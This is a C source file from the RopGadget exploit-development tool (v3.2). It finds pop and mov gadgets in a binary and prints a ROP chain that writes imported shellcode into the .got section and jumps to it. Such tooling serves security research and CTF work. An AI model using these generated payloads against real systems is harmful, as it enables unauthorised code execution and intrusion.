/*
** RopGadget - Release v3.2
** Jonathan Salwan - http://twitter.com/JonathanSalwan
** http://shell-storm.org
** 2011-10-10
**
** Redistribution and use in source and binary forms, with or without
** modification, are permitted provided that the following conditions
** are met:
** 1. Redistributions of source code must retain the above copyright
**    notice, this list of conditions and the following disclaimer.
** 2. Redistributions in binary form must reproduce the above copyright
**    notice, this list of conditions and the following disclaimer in the
**    documentation and/or other materials provided with the distribution.
*/

#include "ropgadget.h"

/* free linked list */
static void free_add_element(t_makecode *element)
{
  t_makecode *tmp;

  while (element)
    {
      tmp = element;
      element = tmp->next;
      free(tmp);
    }
}

/* returns addr of instruction */
static Elf32_Addr ret_addr_makecodefunc(t_makecode *list_ins, char *instruction)
{
  char  *p;

  while (list_ins)
    {
      p = list_ins->instruction;
      while (*p != 0)
        {
          if (!match(p, instruction, strlen(instruction)))
            return (list_ins->addr);
          p++;
        }
      list_ins = list_ins->next;
    }
  return (0);
}

/* returns the numbers of pop in the gadget. */
static int how_many_pop(char *gadget)
{
  int  cpt = 0;
  char *p;

  p = gadget;
  while(*p != '\0')
    {
      if (!strncmp(p, "pop", 3))
        cpt++;
      p++;
    }
  return (cpt);
}

/* returns the numbers of "pop" befor pop_reg */
static int how_many_pop_before(char *gadget, char *pop_reg)
{
  int cpt = 0;

  while (strncmp(gadget, pop_reg, strlen(pop_reg)) && *gadget != '\0')
    {
      if (!strncmp(gadget, "pop", 3))
        cpt++;
      gadget++;
    }
  return (cpt);
}

/* returns the numbers of "pop" after pop_reg */
static int how_many_pop_after(char *gadget, char *pop_reg)
{
  int cpt = 0;

  while(strncmp(gadget, pop_reg, strlen(pop_reg)))
    {
      if (*gadget == '\0')
        return (0);
      gadget++;
    }
  gadget += strlen(pop_reg);

  while (*gadget != '\0')
    {
      if (!strncmp(gadget, "pop", 3))
        cpt++;
      gadget++;
    }
  return (cpt);
}

/* display padding */
static void display_padding(int i)
{
  while (i != 0)
    {
      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x42424242) # padding%s\n", BLUE, ENDC);
      i--;
    }
}

/* partie 1 | import shellcode in ROP instruction */
static void makepartie1_importsc(t_makecode *list_ins, int useless)
{
/*
  gad1 pop %e?x
  gad2 mov (%e?x),%e?x
  gad3 mov %e?x,%e?x
  gad4 mov %e?x,(%e?x)
*/

  int i = 0;
  Elf32_Addr addr_gad1;
  Elf32_Addr addr_gad2;
  Elf32_Addr addr_gad3;
  Elf32_Addr addr_gad4;
  char *gad1;
  char *gad2;
  char *gad3;
  char *gad4;

  addr_gad1 = ret_addr_makecodefunc(list_ins, "pop %e?x");
  gad1      = get_gadget_since_addr(addr_gad1);
  addr_gad2 = ret_addr_makecodefunc(list_ins, "mov (%e?x),%e?x");
  gad2      = get_gadget_since_addr(addr_gad2);
  addr_gad3 = ret_addr_makecodefunc(list_ins, "mov %e?x,%e?x");
  gad3      = get_gadget_since_addr(addr_gad3);
  addr_gad4 = ret_addr_makecodefunc(list_ins, "mov %e?x,(%e?x)");
  gad4      = get_gadget_since_addr(addr_gad4);

  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  fprintf(stdout, "\t\t%s# Shellcode imported! Generated by RopGadget v3.2%s\n", BLUE, ENDC);

  while (importsc_mode.poctet->next != NULL)
    importsc_mode.poctet = importsc_mode.poctet->next;

  while (i != importsc_mode.size && importsc_mode.poctet != NULL)
    {
      /* pop %edx */
      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_gad1, gad1, ENDC);
      display_padding(how_many_pop_before(gad1, "pop %edx"));
      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ 0x%.2x%s\n", BLUE, importsc_mode.poctet->addr, importsc_mode.poctet->octet, ENDC);
      display_padding(how_many_pop_after(gad1, "pop %edx"));
      /* mov (%edx),%ecx */
      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_gad2, gad2, ENDC);
      display_padding(how_many_pop(gad2));
      if (useless < 0)
        {
          /* mov %ecx,%eax */
          fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_gad3, gad3, ENDC);
          display_padding(how_many_pop(gad3));
        }
      /* pop %edx */
      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_gad1, gad1, ENDC);
      display_padding(how_many_pop_before(gad1, "pop %edx"));
      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .got + %d%s\n", BLUE, Addr_sGot + i, i, ENDC);
      display_padding(how_many_pop_after(gad1, "pop %edx"));
      /* mov %eax,(%edx) */
      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_gad4, gad4, ENDC);
      display_padding(how_many_pop(gad4));
      importsc_mode.poctet = importsc_mode.poctet->back;
      i++;
    }
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # jump to our shellcode in .got%s\n", BLUE,  Addr_sGot , ENDC);
}

void makecode_importsc(t_makecode *list_ins, int useless)
{
  if (!bind_mode.flag)
    {
      makepartie1_importsc(list_ins, useless);
      fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
      }
  else
    fprintf(stderr, "\t%sError. Don't set a -bind flag%s\n", RED, ENDC);
  free_add_element(list_ins);
}
